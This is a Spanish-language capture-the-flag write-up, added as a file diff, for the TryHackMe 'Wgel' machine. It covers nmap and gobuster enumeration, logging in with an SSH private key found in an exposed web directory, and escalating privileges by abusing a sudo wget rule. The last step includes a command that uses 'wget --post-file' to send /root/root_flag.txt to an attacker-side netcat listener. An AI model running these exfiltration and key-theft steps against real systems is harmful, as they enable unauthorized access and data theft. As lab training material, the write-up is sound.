@@ -1,0 +1,267 @@
+I"�Q<p>La máquina Wgel es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.</p>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-15 05:59 EDT
+Initiating Connect Scan at 05:59
+Scanning 10.10.17.209 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.17.209
+Discovered open port 22/tcp on 10.10.17.209
+Completed Connect Scan at 06:00, 22.82s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.17.209
+Host is up, received user-set <span class="o">(</span>0.069s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-10-15 05:59:51 EDT <span class="k">for </span>23s
+Not shown: 41633 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 23900 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.88 seconds
+</code></pre></div></div>
+
+<p>Nos reporta una serie de puertos abiertos. Debido a que el puerto 80 está abierto, introducimos la $IP-VICTIMA en un buscador y nos reporta el servicio Apache. No podemos sacar muchas más información por lo que inseccionamos el código de la página y conseguimos un usuario potencial con un comentario en el código:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Jessie don't forget to udate the website
+</code></pre></div></div>
+<p>Para obtener más información podemos realizar un escaneo con nmap para obtener más información de estos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>, 80 <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-15 06:06 EDT
+Nmap scan report <span class="k">for </span>10.10.17.209
+Host is up <span class="o">(</span>0.051s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa <span class="o">(</span>RSA<span class="o">)</span>
+|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.63 seconds
+<span class="o">[</span>1]    5495 segmentation fault  nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.17.209 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+<p>No muchas más información, únicamente una posible clave RSA.</p>
+
+<p>Escaneamos directorios con gobuster y nos reporta lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.17.209/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 25 <span class="nt">-x</span> php,html,txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.17.209/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 25
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              php,html,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/10/15 06:10:52 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11374]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11374]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]  
+/sitemap              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/sitemap/]
+                                                                                  
+<span class="o">===============================================================</span>
+2022/10/15 06:11:30 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>Nos metemos en la IP seguido de /sitemap y encontramos una web pero nada más.</p>
+
+<p>DEcidimos volver a escanear pero desde el directorio /sitemap</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.17.209/sitemap/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 25 <span class="nt">-x</span> php,html,txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.17.209/sitemap/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 25
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              php,html,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/10/15 06:14:11 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.ssh                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/sitemap/.ssh/]
+/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.htpasswd.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.hta.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.htpasswd.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/.hta.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                        
+/about.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12232]                                      
+/blog.html            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12745]                                      
+/contact.html         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10346]                                      
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/sitemap/css/] 
+/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/sitemap/fonts/]
+/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/sitemap/images/]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 21080]                                        
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 21080]                                        
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/sitemap/js/]    
+/services.html        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10131]                                        
+/shop.html            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17257]                                        
+/work.html            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11428]                                        
+                                                                                         
+<span class="o">===============================================================</span>
+2022/10/15 06:14:49 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>De los directorios que nos reporta con código existoso, el único que llama la atención es /.ssh</p>
+
+<p>Entramos en el y nos reporta una clave privada de SSH.</p>
+
+<h1 id="acceso-al-sistema"><a href="#header-1"></a>Acceso al sistema</h1>
+
+<p>Con el usuario anterior, intentamos conectarnos por SSH con la clave privada. Para ello debemos crearnos un archivo que se llame id_rsa y darle permisos con chmod (chmod 600 id_rsa). En este punto nos conectamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa jessie@10.10.17.209
+Welcome to Ubuntu 16.04.6 LTS <span class="o">(</span>GNU/Linux 4.15.0-45-generic i686<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+
+8 packages can be updated.
+8 updates are security updates.
+
+jessie@CorpOne:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Conseguimos acceso al sistema. Investigamos un poco y conseguimos la flag del usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jessie@CorpOne:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-R</span>
+.:
+Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
+
+./Desktop:
+
+./Documents:
+user_flag.txt
+
+./Downloads:
+
+./Music:
+
+./Pictures:
+
+./Public:
+
+./Templates:
+
+./Videos:
+jessie@CorpOne:~<span class="nv">$ </span><span class="nb">cd </span>Documents/
+jessie@CorpOne:~/Documents<span class="nv">$ </span><span class="nb">cat </span>user_flag.txt 
+????????????????????????<span class="s1">''</span>
+</code></pre></div></div>
+
+<p>Hacemos sudo -l para ver que comandos podemos ejecutar como root y nos reporta lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jessie@CorpOne:~/Documents<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>jessie on CorpOne:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/wget
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios"><a href="#header-1"></a>Escalada de privilegios</h1>
+
+<p>Parece ser que podemos pasarnos archivos a nuestro equipo mediante wget. Visito <a href="http://gtfobins.github.io">GTFOBins</a> para ver el método y lo llevo a cabo.</p>
+
+<p>Me pongo en esucha por el puerto 80 desde mi equipo y redirigo el output que me va a llegar al archivo root_flag.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 80 <span class="o">&gt;</span> root_flag.txt
+listening on <span class="o">[</span>any] 80 ...
+</code></pre></div></div>
+
+<p>Por otro lado, desde el usuario Jessie ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/wget <span class="nt">--post-file</span><span class="o">=</span>/root/root_flag.txt http://<span class="nv">$YOUR</span><span class="nt">-IP</span>/
+</code></pre></div></div>
+
+<p>Nos confirma la conexión y podemos abrir el archivo root_flag desde nuestro equipo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>root_flag.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: root_flag.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ POST / HTTP/1.1
+   2   │ User-Agent: Wget/1.17.1 <span class="o">(</span>linux-gnu<span class="o">)</span>
+   3   │ Accept: <span class="k">*</span>/<span class="k">*</span>
+   4   │ Accept-Encoding: identity
+   5   │ Host: 10.8.79.39
+   6   │ Connection: Keep-Alive
+   7   │ Content-Type: application/x-www-form-urlencoded
+   8   │ Content-Length: 33
+   9   │ 
+  10   │ ??????????????????????????????????
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Obtenemos así la flag de root!</p>
+
+<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
+:ET
